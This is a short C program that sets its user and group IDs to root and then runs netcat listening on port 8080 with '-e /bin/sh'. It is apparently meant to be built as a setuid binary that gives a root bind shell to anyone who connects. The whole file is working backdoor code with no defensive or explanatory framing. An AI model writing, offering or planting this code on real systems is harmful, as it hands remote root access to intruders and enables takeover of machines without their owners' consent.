#include <stdlib.h>

int main(int argc, char **argv, char **envp) {
	setuid(0); // These two are necessary, as system() drops privileges
	setgid(0);
	char *args[] = {  "nc", "-lp8080", "-e/bin/sh", (char *) 0 };
	execve("/bin/nc", args, envp);
}